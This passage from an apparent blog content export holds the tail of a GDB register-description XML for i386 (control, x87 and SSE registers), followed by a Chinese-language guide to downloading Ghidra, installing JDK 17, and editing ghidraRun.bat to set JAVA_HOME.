class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;TSD&quot;</span> <span class="attr">start</span>=<span class="string">&quot;2&quot;</span> <span class="attr">end</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;DE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;3&quot;</span> <span class="attr">end</span>=<span class="string">&quot;3&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PSE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;4&quot;</span> <span class="attr">end</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PAE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;5&quot;</span> <span class="attr">end</span>=<span class="string">&quot;5&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;MCE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;6&quot;</span> <span class="attr">end</span>=<span class="string">&quot;6&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PGE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;7&quot;</span> <span class="attr">end</span>=<span class="string">&quot;7&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PCE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;8&quot;</span> <span class="attr">end</span>=<span class="string">&quot;8&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;OSFXSR&quot;</span> <span class="attr">start</span>=<span class="string">&quot;9&quot;</span> <span class="attr">end</span>=<span class="string">&quot;9&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;OSXMMEXCPT&quot;</span> <span class="attr">start</span>=<span class="string">&quot;10&quot;</span> <span class="attr">end</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;UMIP&quot;</span> <span class="attr">start</span>=<span class="string">&quot;11&quot;</span> <span class="attr">end</span>=<span class="string">&quot;11&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;LA57&quot;</span> <span class="attr">start</span>=<span class="string">&quot;12&quot;</span> <span class="attr">end</span>=<span class="string">&quot;12&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;VMXE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;13&quot;</span> <span class="attr">end</span>=<span class="string">&quot;13&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;SMXE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;14&quot;</span> <span class="attr">end</span>=<span class="string">&quot;14&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;FSGSBASE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;16&quot;</span> <span class="attr">end</span>=<span class="string">&quot;16&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PCIDE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;17&quot;</span> <span class="attr">end</span>=<span class="string">&quot;17&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;OSXSAVE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;18&quot;</span> <span class="attr">end</span>=<span class="string">&quot;18&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;SMEP&quot;</span> <span class="attr">start</span>=<span class="string">&quot;20&quot;</span> <span class="attr">end</span>=<span class="string">&quot;20&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;SMAP&quot;</span> <span class="attr">start</span>=<span class="string">&quot;21&quot;</span> <span class="attr">end</span>=<span class="string">&quot;21&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PKE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;22&quot;</span> <span class="attr">end</span>=<span class="string">&quot;22&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">flags</span> <span class="attr">id</span>=<span class="string">&quot;i386_efer&quot;</span> <span class="attr">size</span>=<span class="string">&quot;8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;TCE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;15&quot;</span> <span class="attr">end</span>=<span class="string">&quot;15&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;FFXSR&quot;</span> <span class="attr">start</span>=<span class="string">&quot;14&quot;</span> <span class="attr">end</span>=<span class="string">&quot;14&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;LMSLE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;13&quot;</span> <span class="attr">end</span>=<span class="string">&quot;13&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;SVME&quot;</span> <span class="attr">start</span>=<span class="string">&quot;12&quot;</span> <span class="attr">end</span>=<span class="string">&quot;12&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;NXE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;11&quot;</span> <span class="attr">end</span>=<span class="string">&quot;11&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;LMA&quot;</span> <span class="attr">start</span>=<span class="string">&quot;10&quot;</span> <span class="attr">end</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;LME&quot;</span> <span class="attr">start</span>=<span class="string">&quot;8&quot;</span> <span class="attr">end</span>=<span class="string">&quot;8&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;SCE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;0&quot;</span> <span class="attr">end</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;cr0&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i386_cr0&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;cr2&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;cr3&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i386_cr3&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;cr4&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i386_cr4&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;cr8&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;efer&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i386_efer&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;st0&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;80&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i387_ext&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;st1&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;80&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i387_ext&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;st2&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;80&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i387_ext&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;st3&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;80&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i387_ext&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;st4&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;80&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i387_ext&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;st5&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;80&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i387_ext&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;st6&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;80&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i387_ext&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;st7&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;80&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i387_ext&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;fctrl&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">group</span>=<span class="string">&quot;float&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;fstat&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">group</span>=<span class="string">&quot;float&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;ftag&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">group</span>=<span class="string">&quot;float&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;fiseg&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">group</span>=<span class="string">&quot;float&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;fioff&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">group</span>=<span class="string">&quot;float&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;foseg&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">group</span>=<span class="string">&quot;float&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;fooff&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">group</span>=<span class="string">&quot;float&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;fop&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int&quot;</span> <span class="attr">group</span>=<span class="string">&quot;float&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--/feature&gt;</span></span><br><span class="line"><span class="comment">&lt;feature name=&quot;org.gnu.gdb.i386.32bit.sse&quot;--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">vector</span> <span class="attr">id</span>=<span class="string">&quot;v4f&quot;</span> <span class="attr">type</span>=<span class="string">&quot;ieee_single&quot;</span> <span class="attr">count</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">vector</span> <span class="attr">id</span>=<span class="string">&quot;v2d&quot;</span> <span class="attr">type</span>=<span class="string">&quot;ieee_double&quot;</span> <span class="attr">count</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">vector</span> <span class="attr">id</span>=<span class="string">&quot;v16i8&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int8&quot;</span> <span class="attr">count</span>=<span class="string">&quot;16&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">vector</span> <span class="attr">id</span>=<span class="string">&quot;v8i16&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int16&quot;</span> <span class="attr">count</span>=<span class="string">&quot;8&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">vector</span> <span class="attr">id</span>=<span class="string">&quot;v4i32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int32&quot;</span> <span class="attr">count</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">vector</span> <span class="attr">id</span>=<span class="string">&quot;v2i64&quot;</span> <span class="attr">type</span>=<span class="string">&quot;int64&quot;</span> <span class="attr">count</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">union</span> <span class="attr">id</span>=<span class="string">&quot;vec128&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;v4_float&quot;</span> <span class="attr">type</span>=<span class="string">&quot;v4f&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;v2_double&quot;</span> <span class="attr">type</span>=<span class="string">&quot;v2d&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;v16_int8&quot;</span> <span class="attr">type</span>=<span class="string">&quot;v16i8&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;v8_int16&quot;</span> <span class="attr">type</span>=<span class="string">&quot;v8i16&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;v4_int32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;v4i32&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;v2_int64&quot;</span> <span class="attr">type</span>=<span class="string">&quot;v2i64&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;uint128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;uint128&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">union</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">flags</span> <span class="attr">id</span>=<span class="string">&quot;i386_mxcsr&quot;</span> <span class="attr">size</span>=<span class="string">&quot;4&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;IE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;0&quot;</span> <span class="attr">end</span>=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;DE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;1&quot;</span> <span class="attr">end</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;ZE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;2&quot;</span> <span class="attr">end</span>=<span class="string">&quot;2&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;OE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;3&quot;</span> <span class="attr">end</span>=<span class="string">&quot;3&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;UE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;4&quot;</span> <span class="attr">end</span>=<span class="string">&quot;4&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PE&quot;</span> <span class="attr">start</span>=<span class="string">&quot;5&quot;</span> <span class="attr">end</span>=<span class="string">&quot;5&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;DAZ&quot;</span> <span class="attr">start</span>=<span class="string">&quot;6&quot;</span> <span class="attr">end</span>=<span class="string">&quot;6&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;IM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;7&quot;</span> <span class="attr">end</span>=<span class="string">&quot;7&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;DM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;8&quot;</span> <span class="attr">end</span>=<span class="string">&quot;8&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;ZM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;9&quot;</span> <span class="attr">end</span>=<span class="string">&quot;9&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;OM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;10&quot;</span> <span class="attr">end</span>=<span class="string">&quot;10&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;UM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;11&quot;</span> <span class="attr">end</span>=<span class="string">&quot;11&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;PM&quot;</span> <span class="attr">start</span>=<span class="string">&quot;12&quot;</span> <span class="attr">end</span>=<span class="string">&quot;12&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">field</span> <span class="attr">name</span>=<span class="string">&quot;FZ&quot;</span> <span class="attr">start</span>=<span class="string">&quot;15&quot;</span> <span class="attr">end</span>=<span class="string">&quot;15&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;xmm0&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;vec128&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;xmm1&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;vec128&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;xmm2&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;vec128&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;xmm3&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;vec128&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;xmm4&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;vec128&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;xmm5&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;vec128&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;xmm6&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;vec128&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;xmm7&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;128&quot;</span> <span class="attr">type</span>=<span class="string">&quot;vec128&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">reg</span> <span class="attr">name</span>=<span class="string">&quot;mxcsr&quot;</span> <span class="attr">bitsize</span>=<span class="string">&quot;32&quot;</span> <span class="attr">type</span>=<span class="string">&quot;i386_mxcsr&quot;</span> <span class="attr">group</span>=<span class="string">&quot;vector&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">feature</span>&gt;</span></span><br></pre></td></tr></table></figure>
</div></div>

]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>Ghidra 安装与使用指南</title>
    <url>/2022/10/05/Ghidra/</url>
    <content><![CDATA[<h1 id="Ghidra"><a href="#Ghidra" class="headerlink" title="Ghidra"></a>Ghidra</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li><a href="https://ghidra-sre.org/">Ghidra</a> 是一个由美国国家安全局开发的开源免费的逆向工程工具，跟 IDA Pro 有的一拼。</li>
</ul>
<blockquote>
<p>📖 wiki:  <a href="https://en.wikipedia.org/wiki/Ghidra">https://en.wikipedia.org/wiki/Ghidra</a></p>
<p>Ghidra (pronounced Gee-druh; &#x2F;ˈɡiːdrə&#x2F;) is a free and open source reverse engineering tool developed by the National Security Agency (NSA) of the United States. The binaries were released at RSA Conference in March 2019; the sources were published one month later on GitHub. Ghidra is seen by many security researchers as a competitor to IDA Pro. The software is written in Java using the Swing framework for the GUI. The decompiler component is written in C++. Ghidra plugins can be developed in Java or in Python (provided via Jython).</p>
</blockquote>
<p>感觉 Ghidra 比较不错的几点：</p>
<ul>
<li>开源免费</li>
<li>全平台可用(Windows、MacOS、Linux)</li>
<li>32位、64位程序都可以直接拖拽进来分析，不需要像 IDA 那样分析 32位、64 位程序需要选用指定版本的程序打开才能进行反编译操作</li>
</ul>
<p>缺点:</p>
<ul>
<li>没有 IDA Pro 的远程调试、动态调试</li>
<li>支持的处理器系列没有 IDA Pro 多，不过已经足够用了 (x86、arm、mips、risc-v都是支持的)</li>
<li>部分反汇编结果不如 IDA Pro 智能</li>
</ul>
<h2 id="下载安装"><a href="#下载安装" class="headerlink" title="下载安装"></a>下载安装</h2><p>📥 <strong>下载</strong>：</p>
<ul>
<li><a href="https://github.com/NationalSecurityAgency/ghidra">https://github.com/NationalSecurityAgency/ghidra</a><ul>
<li><del>截止本文发布时的最新版本（<strong>ghidra_10.1.5_PUBLIC_20220726</strong>）<a href="https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.1.5_build/ghidra_10.1.5_PUBLIC_20220726.zip">下载链接</a></del></li>
<li>截止本文更新时最新版本（<strong>ghidra_10.4_PUBLIC_20230928</strong>）<a href="https://github.com/NationalSecurityAgency/ghidra/releases/download/Ghidra_10.4_build/ghidra_10.4_PUBLIC_20230928.zip">下载链接</a></li>
</ul>
</li>
</ul>
<p>📦 <strong>环境</strong>：</p>
<ul>
<li>需要下载安装 JDK 17 64-bit<ul>
<li><blockquote>
<p>JDK 版本根据 github 最新的文档中指明的为准，<del>截止本文发布时需安装 JDK 11</del> 现需安装 JDK 17</p>
</blockquote>
</li>
<li><a href="https://adoptium.net/releases.html?variant=openjdk17&jvmVariant=hotspot">zip 压缩包版本</a><ul>
<li>选择对应的操作系统、硬件架构下载 <code>.zip</code> 压缩包</li>
</ul>
</li>
</ul>
</li>
<li>下载好 JDK17 的压缩包后解压到想存放的目录下，记录好这个路径，例如 <code>D:\Program Files\Java\jdk-17.0.7+7</code></li>
</ul>
<blockquote>
<p>选择使用不影响原有Java环境的方式配置JDK环境</p>
</blockquote>
<p>🛠 <strong>安装</strong>：</p>
<ul>
<li><p>解压后执行启动脚本即可运行，官方也有<a href="https://ghidra-sre.org/InstallationGuide.html">安装向导</a></p>
<ul>
<li>Windows 执行 <code>ghidraRun.bat</code> 脚本启动程序</li>
<li>Linux &#x2F; MacOS 执行 <code>ghidraRun</code> 启动程序<blockquote>
<p>可以手动制作一个快捷方式便于启动（将启动脚本作为目标程序，解压后的support文件夹中也有ico图标）</p>
</blockquote>
</li>
</ul>
</li>
<li><p>如果没有 Java 环境会直接弹出 <code>Java runtime not found.</code> 的情况，需要手动配置 Java 环境变量</p>
<ul>
<li>这里提供一个临时配置JAVA环境变量(专供Ghidra启动)的方法：</li>
<li>(Windows) 修改 ghidraRun.bat 文件【找不到这文件的先打开文件扩展名显示】，在最后一行 call 命令前面添加两行：<ul>
<li><code>set JAVA_HOME=刚刚复制的JDK路径</code></li>
<li><code>set PATH=%JAVA_HOME%\bin;%PATH%</code></li>
</ul>
</li>
</ul>
</li>
<li><p>如果有 java 环境但非 jdk17，启动后会提示找不到 JDK17，需要手动输入路径，把先前记录的 JDK17 路径填上即可</p>
</li>
</ul>
<details class="note info"><summary><p>修改后的 <code>ghidraRun.bat</code> 示例</p>
</summary>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:: Ghidra launch</span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span></span><br><span class="line"></span><br><span class="line">:: Maximum heap memory may be changed <span class="keyword">if</span> default is inadequate. This will generally be up to <span class="number">1</span>/<span class="number">4</span> of </span><br><span class="line">:: the physical memory available to the OS. Uncomment MAXMEM setting <span class="keyword">if</span> non-default value is needed.</span><br><span class="line">::<span class="built_in">set</span> MAXMEM=<span class="number">2</span>G</span><br><span class="line"><span class="built_in">set</span> JAVA_HOME=D:\Program Files\Java\jdk-<span class="number">17</span>.<span class="number">0</span>.<span class="number">7</span>+<span class="number">7</span></span><br><span class="line"><span class="built_in">set</span> <span class="built_in">PATH</span>=<span class="variable">%PATH%</span>;<span class="variable">%JAVA_HOME%</span>\bin</span><br><span class="line"><span class="keyword">call</span> &quot;%~dp0support\launch.bat&quot; bg jdk Ghidra &quot;<span class="variable">%MAXMEM%</span>&quot; &quot;&quot; ghidra.GhidraRun %*</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</details>

<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20230718125510594.png" alt="Windows下的命令行提示" style="zoom:50%;" />

